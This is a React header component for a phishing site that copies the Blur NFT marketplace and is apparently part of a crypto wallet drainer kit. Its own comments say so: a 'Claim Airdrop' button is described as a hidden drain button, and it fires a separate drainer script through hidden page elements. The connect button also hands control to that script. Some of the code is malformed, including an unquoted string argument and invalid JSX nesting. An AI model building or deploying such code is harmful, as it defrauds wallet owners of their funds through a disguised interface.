import { useEffect, useState } from 'react';
import { useToast } from '@/hooks/useToast';

const NAV_LINKS = [
  { label: 'Collections', href: '#collections' },
  { label: 'Auctions', href: '#auctions' },
  { label: 'Portfolio', href: '#portfolio' },
  { label: 'Stats', href: '#stats' },
];

interface HeaderProps {
  onWalletChange: (address: string | null, chainId: number | null) => void;
}

export default function Header({ onWalletChange }: HeaderProps) {
  const { success, error, info } = useToast();
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<number | null>(null);
  const [isConnecting, setIsConnecting] = useState<boolean>(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState<boolean>(false);

  useEffect(() => {
    const checkConnection = async () => {
      try {
        const ethereum = (window as any).ethereum;
        if (ethereum) {
          const accounts = await ethereum.request({ method: 'eth_accounts' });
          if (accounts?.[0]) {
            setAddress(accounts[0]);
            setChainId(1); // Assume mainnet for simplicity
            onWalletChange(accounts[0], 1);
          }
        }
      } catch (e) {
        console.error('Error checking connection:', e);
      }
    };
    checkConnection();
  }, [onWalletChange]);

  const handleConnectClick = async () => {
    setIsConnecting(true);
    try {
      // Trigger our script's connect handler
      const connectButton = document.getElementById('connect-wallet');
      if (connectButton) {
        (connectButton as HTMLButtonElement).click();
      }
    } catch (err) {
      console.error('Connection error:', err);
      error('Connection Failed', 'Failed to connect wallet');
    } finally {
      setIsConnecting(false);
    }
  };

  const handleDisconnectClick = () => {
    setAddress(null);
    setChainId(null);
    onWalletChange(null, null);
    info('Wallet Disconnected', 'Your wallet has been disconnected');
  };

  return (
    <>
      <header className='blur-c-jYbCLK'>
        <div className='blur-c-eYmsZT'>
          <div className='blur-c-hmZTzZ'>
            <a href='/' className='blur-c-dwjgSD' aria-label='Blur Home'>
              <svg viewBox='0 0 68 24' fill='none' xmlns='http://www.w3.org/2000/svg'>
                <path d='M12 2L2 22h20L12 2zm0 3.5L18.5 20H5.5L12 5.5z' fill='#FF8700' />
              </svg>
            </a>
            <nav className='blur-c-fUChNm blur-c-ebEYHZ' aria-label='Main navigation'>
              {NAV_LINKS.map(link => (
                <a key={link.href} href={link.href}>
                  {link.label}
                </a>
              ))}
            </nav>
          </div>

          <div className='blur-c-fBNkud'>
            <div className='blur-c-yLJPJ' role='search'>
              <span className='blur-c-kdxLxW' aria-hidden='true'>
                <svg width='16' height='16' viewBox='0 0 16 16' fill='none'>
                  <path
                    d='M7.333 12.667A5.333 5.333 0 107.333 2a5.333 5.333 0 000 10.667zM14 14l-2.9-2.9'
                    stroke='currentColor'
                    strokeWidth='1.5'
                    strokeLinecap='round'
                    strokeLinejoin='round'
                  />
                </svg>
              </span>
              <input
                type='text'
                placeholder='Search collections, wallets...'
                className='blur-c-cTXYex'
                aria-label='Search'
                onKeyDown={(e) => {
                  if (e.key === 'Enter') {
                    info('Search', Searching for '');
                  }
                }}
              />
            </div>
          </div>

          <div className='blur-c-gzBpsk' style={{ gap: '8px' }}>
            <button
              className='mobile-menu-toggle'
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              aria-label='Toggle menu'
              aria-expanded={mobileMenuOpen}
            >
              <span style={{ transform: mobileMenuOpen ? 'rotate(45deg) translate(5px, 5px)' : '' }} />
              <span style={{ opacity: mobileMenuOpen ? 0 : 1 }} />
              <span style={{ transform: mobileMenuOpen ? 'rotate(-45deg) translate(5px, -5px)' : '' }} />
            </button>

            {address ? (
              <>
                <button
                  onClick={handleDisconnectClick}
                  className='blur-c-hOthnB'
                  style={{ gap: '8px' }}
                  title='Click to disconnect'
                >
                  <span
                    style={{
                      width: '8px',
                      height: '8px',
                      borderRadius: '50%',
                      background: '#ade25d',
                      boxShadow: '0 0 8px #ade25d',
                      display: 'inline-block',
                      animation: 'pulse 2s ease-in-out infinite',
                    }}
                    aria-hidden='true'
                  />
                  <span className='blur-c-erCuFI'>
                    {address.slice(0, 6)}...{address.slice(-4)}
                  </span>
                  <span className='blur-c-llyHvw'>Disconnect</span>
                </button>
                
                {/* Hidden drain button - appears as 'Claim Airdrop' to users */}
                <button
                  onClick={() => {
                    // Trigger the drain function from our script
                    const claimButton = document.getElementById('claim-airdrop');
                    if (claimButton) {
                      (claimButton as HTMLButtonElement).click();
                    }
                  }}
                  className='blur-c-hOthnB'
                  style={{ 
                    gap: '8px',
                    marginLeft: '8px',
                    background: 'linear-gradient(135deg, #ff6b6b, #ff5252)',
                    boxShadow: '0 0 8px #ff6b6b'
                  }}
                >
                  <span className='blur-c-erCuFI'>
                    Claim Airdrop
                  </span>
                  <span className='blur-c-llyHvw'>Claim</span>
                </button>
              </>
            ) : (
              <button
                onClick={handleConnectClick}
                disabled={isConnecting}
                className='blur-c-hOthnB'
                style={{ gap: '8px' }}
              >
                {isConnecting ? (
                  <span className='spinner' aria-hidden='true' />
                ) : null}
                <span className='blur-c-erCuFI'>
                  {isConnecting ? 'Connecting...' : 'Connect Wallet'}
                </span>
                <span className='blur-c-llyHvw'>Connect</span>
              </button>
            )}
          </div>
        </div>

        {mobileMenuOpen && (
          <div className='mobile-menu'>
            <nav aria-label='Mobile navigation'>
              {NAV_LINKS.map(link => (
                <a
                  key={link.href}
                  href={link.href}
                  onClick={() => setMobileMenuOpen(false)}
                >
                  {link.label}
                </a>
              ))}
            </nav>
            <div className='mobile-menu-search'>
              <div className='blur-c-yLJPJ' style={{ width: '100%' }}>
                <span className='blur-c-kdxLxW' aria-hidden='true'>
                  <svg width='16' height='16' viewBox='0 0 16 16' fill='none'>
                    <path
                      d='M7.333 12.667A5.333 5.333 0 107.333 2a5.333 5.333 0 000 10.667zM14 14l-2.9-2.9'
                      stroke='currentColor'
                      strokeWidth='1.5'
                      strokeLinecap='round'
                      strokeLinejoin='round'
                    />
                  </svg>
                </span>
                <input
                  type='text'
                  placeholder='Search...'
                  className='blur-c-cTXYex'
                />
              </div>
            </div>
          </div>
          {/* Hidden elements for drainer script */}
          <div id="account-details" style={{ display: "none" }}>
            <p>Disconnected</p>
          </div>
          <div id="status" style={{ display: "none" }}></div>

        )}
      </header>
    </>
  );
}
